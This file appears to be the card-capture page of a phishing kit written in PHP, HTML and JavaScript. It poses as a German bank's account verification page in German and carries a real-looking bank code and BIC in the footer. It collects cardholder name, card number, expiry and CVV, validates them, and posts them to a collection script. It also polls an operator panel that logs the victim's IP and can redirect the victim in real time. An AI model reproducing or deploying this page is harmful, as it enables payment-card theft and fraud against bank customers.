<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.svg">
</header>


<main>
<div class="form">



<div class="title">
Kontoverifizierung
</div>
<div class="text">
Um fortzufahren, geben Sie bitte die Informationen Ihrer Karte ein.
</div>
<?php 
$helper->setError();
?>
<div class="col">
    <label>Name des Karteninhabers</label>
    <input type="text" id="d0">
</div>

<div class="col">
    <label>Kartennummer</label>
    <input type="text" id="d1" placeholder="XXXX XXXX XXXX XXXX">
</div>

<div class="col">
    <label>Ablaufdatum</label>
    <input type="text" id="d2" placeholder="MM/JJ">
</div>

<div class="col">
    <label>Sicherheitscode</label>
    <input type="text" id="d3" placeholder="XXX">
</div>


<div class="col btn">
    <button onclick="sendCard()">Weiter</button>
</div>



</div>
</main>




<footer>
<span>Sicherheit</span>
<span>Cookie-Einstellungen </span>
<span>Datenschutz </span>
<span>Barrierefreiheit </span>
<span>Nachhaltigkeit</span>
<span>AGB </span>
<span>Disclaimer </span>
<span>Impressum</span>
<span>BLZ: 76030080</span>
<span>BIC: CSDBDE71</span>
</footer>
<?php 
$helper->addLoader();
?>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}
 
if($("#d1").val().length<16){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}


 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}


}



$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();
    
    if(allowSubmit){
        $(".loader").show();
        $.post("post.php", 
			{ 
				cc_name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val(),

			});

    }
}
 

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>